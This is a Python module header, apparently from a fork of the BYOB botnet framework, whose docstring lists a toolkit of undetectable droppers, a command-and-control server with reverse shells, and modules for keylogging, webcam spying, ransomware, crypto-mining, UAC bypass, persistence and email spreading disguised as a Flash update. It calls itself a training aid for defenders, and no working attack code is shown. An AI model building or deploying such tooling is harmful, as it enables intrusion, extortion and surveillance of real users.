#!/usr/bin/python
# -*- coding: utf-8 -*-
"""Core Modules

        888                      
        888                      
        888                      
 .d88b. 888     888  888.d8888b  
d8P  Y8b888     888  88888K      
88888888888     888  888"Y8888b. 
Y8b.    888     Y88b 888     X88 
 "Y8888 88888888 "Y88888 88888P' 
                     888         
                Y8b d88P         
                 "Y88P"   

ELYS is an open-source project that provides a library of packages
and modules which provide a basic framework for security researchers and
developers looking to roll-up their sleeves and get some hands-on experience
defending networks against a simulated botnet roll-out with realistic droppers
that will test the limits of your capacity to defend your network

The library contains 4 main parts:

elys.client
  generates unique, virtually undetectable droppers with staged payloads
  and a number of optional features can be added via intuitive command-line
  arguments, such as: --host, --port, --obfuscate, --compile, --compress, --encrypt
  (see `client.py -h/--help` for detailed usage information)

elys.server
  console based command & control server with a persistent database for
  managing the client's reverse TCP shell sessions, tracking tasks issued
  to each client, storing results of each client's completed tasks, as well
  as hosting the byob.remote package online for clients to access remotely

elys.core
  supackage containing the core modules used by the server

  elys.core.util
    miscellaneous utility functions that are used by many modules

  elys.core.handler
    HTTP POST request handler for receiving client file uploads

  elys.core.security
    module containing the Diffie-Hellman Internet Key Exchange (RFC 2741)
    method for securing a shared secret key even over insecure networks,
    as well as encryption & decryption methods for 2 different modes:
     - AES-256-CBC
     - XOR-128

  elys.core.loader
    enables clients to remotely import any package/module/script from the server
    by requesting the code from the server, loading the code in-memory, where
    it can be directly imported into the currently running process, without
    writing anything to the disk (not even temporary files - zero IO system calls)

  elys.core.payload
    reverse TCP shell designed to remotely import post-exploitation modules from
    server, along with any packages/dependencies), complete tasks issued by
    the server, and handles connections & communication at the socket-level

  elys.core.generators
    module containing functions which all generate code by using the arguments
    given to complete templates of varying size and complexity, and then output
    the code snippets generated as raw text

elys.modules
  add any scripts/modules you want to run on target machines to this directory.
  While the server is online, clients will automatically be able to
  remotely import them into the currently running process without writing anything
  to the disk, and use them directly without installation.

  elys.modules.miner
    run a Bitcoin miner in the background

  elys.modules.keylogger
    logs the user’s keystrokes & the window name entered

  elys.modules.screenshot
    take a screenshot of current user’s desktop

  elys.modules.webcam
    view a live stream or capture image/video from the webcam

  elys.modules.ransom
    encrypt files & generate random BTC wallet for ransom payment

  elys.modules.icloud
    check for logged in iCloud account on macOS

  elys.modules.outlook
    read/search/upload emails from the local Outlook client

  elys.modules.packetsniffer
    run a packet sniffer on the host network & upload .pcap file

  elys.modules.persistence
    establish persistence on the host machine using multiple methods
     - launch agent   (Mac OS X)
     - scheduled task (Windows)
     - startup file   (Windows)
     - registry key   (Windows)
     - crontab job    (Linux)

  elys.modules.phone
    read/search/upload text messages from the client smartphone

  elys.modules.escalate
    (Windows) attempt UAC bypass to gain unauthorized administrator privileges

  elys.modules.portscanner
    scan the local network for other online devices & open ports

  elys.modules.process
    list/search/kill/monitor currently running processes on the host

  elys.modules.spreader
    spread client to other hosts via email disguised as 'Adobe Flash Player Update'

  elys.modules.payloads
    package containing the payloads created by client generator that are being
    hosted locally by the server (rather than uploaded to Pastebin to be hosted
    there anonymously) for the client stagers to load & execute on the target
    host machines

  elys.modules.stagers
    package containing payload stagers created by the client generator along
    with the main payloads, which are hosted locally by the server (rather
    than uploaded to Pastebin to be hosted there anonymously) for the client
    droppers to load & execute on target host machines"""

__all__ = ['database','generators','handler','loader','payloads','security','stagers','util']
__version__ = '1.0'
__license__ = 'GPLv3'
__github__ = 'https://github.com/AeX03/eLys

# def main():
#     for module in __all__:
#         exec("import {}".format(module))

# main()
